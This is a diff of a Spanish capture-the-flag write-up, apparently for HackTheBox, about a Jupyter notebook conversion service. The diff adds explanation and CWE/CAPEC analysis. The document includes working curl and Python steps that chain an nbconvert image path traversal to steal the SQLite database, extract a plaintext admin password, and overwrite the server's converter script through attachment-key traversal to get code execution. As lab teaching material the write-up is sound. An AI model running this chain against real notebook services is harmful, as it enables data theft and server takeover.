@@ -9,7 +9,7 @@
 - python 3
 - sqlite3
 
-### Reconocimiento
+### 1. Reconocimiento
 
 Al iniciar el target e ingresar la URL se presenta una pantalla de login con un formulario de registro. Se registra un usuario de prueba y se inicia sesión para explorar la superficie de ataque.
 
@@ -55,7 +55,7 @@ html
 
 La respuesta es un **302** hacia `/jobs/<job_id>`. Desde ahí se puede descargar el resultado procesado. Entonces el server aceptó el notebook enviado y creó una tarea de procesamiento identificada por un job_id, redirigiendo al usuario a la ruta /jobs/342101d274ff, donde posteriormente puede consultarse o descargarse el resultado generado. El hecho de que la conversión se complete exitosamente, sin errores de validación ni restricciones visibles, puede ser que el servidor analiza y procesa activamente el contenido interno del notebook. Dado que el resultado final depende de lo que contiene el archivo enviado,  es posible que el backend ejecuta o interpreta parte de dicho contenido durante el proceso de conversión. Tal vez, si el notebook incluye referencias a recursos locales o rutas del sistema de archivos, estas podrían ser procesadas por el servidor y reflejarse en la salida generada, lo que justificaría realizar pruebas adicionales para evaluar el alcance de ese acceso.
 
-#### Path traversal en referencias de imagen
+#### 1.1 Path traversal en referencias de imagen
 
 Los notebooks de Jupyter soportan Markdown, y en Markdown las imágenes se insertan con `![alt](ruta)`. Si el servidor no valida esas rutas al generar el HTML, podría leer archivos arbitrarios del sistema de archivos.
 
@@ -148,6 +148,8 @@ Sin embargo, esta funcionalidad está desactivada por defecto (`asset_storage_en
 
 ### 3. Exploit
 
+El exploit se divide en tres fases: Exfiltrar la base de datos usando el AFR descubierto, escalar a admin con las credenciales robadas, y finalmente convertir el path traversal de escritura en ejecución de código.
+
 #### 3.1. Registro y login de usuario de prueba
 
 ```bash
@@ -166,6 +168,8 @@ curl -s -X POST "$TARGET/" -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
 
 
 #### 3.2. Construir el notebook para robar la DB
+
+El análisis de `convert_job.py` reveló que `embed_images = True` hace que nbconvert resuelva rutas de imagen en el sistema de archivos del servidor sin validación. La base de datos se ubica en `data/app.db` y los notebooks se guardan en `data/jobs/<job_id>/incoming/`, por lo que la ruta relativa para alcanzarla es exactamente `../../../../data/app.db`. Se construye el notebook mínimo que explota esa lectura:
 
 ```bash
 cat > /tmp/steal.ipynb << 'NOTEBOOK'
@@ -187,11 +191,9 @@ cat > /tmp/steal.ipynb << 'NOTEBOOK'
 NOTEBOOK
 ```
 
-La ruta `../../../../data/app.db` navega desde `data/jobs/<id>/incoming/` (donde se guarda el notebook) hasta `data/app.db` (la base de datos de la aplicación).
-
-
-
 #### 3.3 Subir el notebook y descargar el HTML con la DB embebida
+
+Se sube el notebook al endpoint /convert que identificamos en el reconocimiento. El servidor responde con un 302 hacia `/jobs/<job_id>`, el mismo flujo observado con el notebook legítimo. La diferencia es que ahora nbconvert incrustará el contenido binario de la base de datos como un blob data:`...;base64,...` dentro del HTML generado:
 
 ```bash
 # Subir el notebook malicioso
@@ -217,7 +219,7 @@ echo "$(wc -c < /tmp/db_out.html) bytes -> /tmp/db_out.html"
 
 #### 3.4. Extraer la contraseña del admin de la DB robada
 
-El HTML contiene múltiples blobs base64 (recursos del tema de nbconvert: fuentes, íconos, CSS). Se extrae la contraseña con Python:
+El HTML de salida contiene múltiples blobs base64 correspondientes a recursos del tema de nbconvert (fuentes, íconos, CSS) además del archivo que nos interesa. Se itera sobre todos ellos buscando la firma SQLite al inicio del contenido decodificado. Una vez encontrado, se conecta directamente a la base de datos en memoria. El análisis del código ya había confirmado que `db.py` almacena la contraseña del admin en texto plano, así que la extracción es directa:
 
 ```python
 # extract_creds.py
@@ -246,6 +248,7 @@ for m in matches:
 
 
 #### 3.5. Login como admin y activar `asset_storage_enabled`
+Con las credenciales en mano se inicia sesión como admin. El reconocimiento mostró que `/admin` devuelve 403 a usuarios regulares; ahora ese panel es accesible. Se activa el setting `asset_storage_enabled`, la condición que el análisis de `services/conversions.py` identificó como prerequisito para que el conversor use `FilesWriter` en lugar del modo de archivo único, habilitando así la segunda vulnerabilidad de path traversal:
 
 ```bash
 ADMIN_PASS="IGD40-eerRdFR5upjG0"
@@ -262,10 +265,8 @@ curl -s -X POST "$TARGET/admin" -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.
 
 #### 3.6. Construir el notebook con el payload RCE
 
-El payload que reemplazará a `convert_job.py` debe:
-1. Ejecutar `/readflag` para obtener la flag.
-2. Escribir el resultado en un archivo dentro del `output_dir` del job.
-3. Imprimir exactamente `{"status": "ok", "output_path": "..."}` en stdout, que es el contrato que `conversions.py` espera para marcar el job como completado y exponer el archivo en `/download`.
+El análisis reveló que `FilesWriter` concatena la clave del attachment directamente con build_directory sin sanitizar separadores de ruta. La clave `../../../../app/converter/convert_job.py`, al resolverse desde el directorio de exports del job, apunta exactamente al script legítimo. El contenido del attachment reemplazará ese script.
+El payload debe respetar el contrato de `conversions.py`: el script recibe `--output-dir` como argumento y debe imprimir `{"status": "ok", "output_path": "..."}` en stdout para que el job sea marcado como completado y el archivo quede disponible en `/download`:
 
 ```python
 import json, base64
@@ -309,11 +310,8 @@ json.dump(nb, open('/tmp/pwn.ipynb', 'w'), indent=2)
 print("[+] /tmp/pwn.ipynb")
 ```
 
-**Por qué funciona la clave del attachment:** `FilesWriter` itera sobre el diccionario de outputs del notebook y usa la clave de cada entrada directamente como nombre de archivo al escribirlo en disco. La clave `../../../../app/converter/convert_job.py`, concatenada con el `build_directory` del job (directorio de exports), resuelve a la ruta absoluta del script legítimo en el servidor.
-
-
-
 #### 3.7. Subir `pwn.ipynb` para sobreescribir el script
+Se sube con formato markdown, la condición exacta que activa el uso de `FilesWriter` según `determine_storage_mode()`. El job se completa y en ese momento `convert_job.py` en el servidor ya es el payload del atacante:
 
 ```bash
 curl -s -X POST "$TARGET/convert" \
@@ -328,7 +326,7 @@ echo "pwn job: $JOB_ID"
 
 #### 3.8. Triggear el RCE enviando cualquier conversión
 
-Con `convert_job.py` reemplazado, cualquier nueva conversión ejecutará el payload. Se reutiliza el `steal.ipynb` anterior:
+Con el script reemplazado, `conversions.py` invocará el payload la próxima vez que lance un subproceso. Se reutiliza `steal.ipynb`, aunque cualquier notebook sirve, ya que el código que se ejecuta ya no es el conversor legítimo sino el payload. El resultado descargable será el HTML con la flag:
 
 ```bash
 curl -s -X POST "$TARGET/convert" \
@@ -361,9 +359,18 @@ FLAG: HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}
 
 ### Vulnerabilidades
 
-| # | Vulnerabilidad | Archivo afectado | CWE | CAPEC | Impacto |
-|---|---|---|---|---|---|
-| 1 | Path Traversal en `embed_images` de nbconvert → AFR | `converter/convert_job.py` | CWE-22 | CAPEC-126 | Lectura de archivos arbitrarios del servidor |
-| 2 | Contraseña de admin almacenada en texto plano | `db.py` | CWE-256 | — | Credenciales admin expuestas al leer la DB |
-| 3 | Path Traversal en `FilesWriter` → sobreescritura de código | `converter/convert_job.py` | CWE-22 + CWE-94 | CAPEC-17, CAPEC-253 | Remote Code Execution |
+1. Path Traversal en embed_images (CWE-22 / CAPEC-126)
+
+La primera vulnerabilidad es un caso clásico de CWE-22: Improper Limitation of a Pathname to a Restricted Directory. `convert_job.py` configura `nbconvert` con `embed_images = True` y pasa la ruta de imagen del notebook directamente al sistema de archivos sin ningún proceso de validacion de que la ruta resultante permanezca dentro de un directorio seguro. Un atacante puede incluir secuencias `../` para salir del directorio de trabajo y leer archivos arbitrarios del servidor.
+El patrón de ataque corresponde a CAPEC-126: Path Traversal, que describe precisamente el abuso de separadores de directorio y secuencias de punto-punto para navegar fuera del árbol de archivos previsto. En este caso el impacto es la lectura completa de `data/app.db`, incluyendo credenciales de todos los usuarios.
+
+2. Contraseña almacenada en texto plano (CWE-256)
+
+`db.py` genera la contraseña del admin con secrets.`token_urlsafe(14)`, pero la persiste en la base de datos sin aplicar ninguna función de derivación de clave (bcrypt, argon2, PBKDF2). Esto encaja en CWE-256: Plaintext Storage of a Password: la fortaleza del secreto generado queda completamente anulada en cuanto un atacante obtiene acceso de lectura al almacén.
+No existe un CAPEC directamente asociado porque esta debilidad no es una técnica de ataque, robar la base de datos no habría entregado credenciales utilizables. Con ella, la primera vulnerabilidad escala automáticamente a compromiso total de la cuenta admin.
+
+3. Path Traversal en `FilesWriter` (CWE-22 y CWE-94 / CAPEC-17 y CAPEC-253)
+
+La tercera vulnerabilidad combina dos debilidades. La primera sigue siendo CWE-22, ahora en la fase de escritura: `FilesWriter` concatena la clave del attachment con el `build_directory` del job sin validar si el path resultante sale del directorio de exports. La segunda es CWE-94: Improper Control of Generation of Code, porque el archivo sobreescrito `convert_job.py` es invocado por el servidor como subproceso en cada conversión posterior, convirtiendo la escritura arbitraria de archivos en ejecución de código arbitrario.
+El primer patrón de ataque asociado es CAPEC-17: Using Malicious Files, que cubre la introducción de archivos con contenido malicioso que el sistema objetivo termina procesando o ejecutando. El segundo es CAPEC-253: Remote Code Inclusion, que describe la sustitución o inyección de código en rutas que la aplicación carga y ejecuta dinámicamente. Aquí ambos patrones se materializan juntos: el notebook actúa como el archivo malicioso portador del payload, y la ejecución vía subprocess.run en el siguiente job es la inclusión remota de ese código.
 
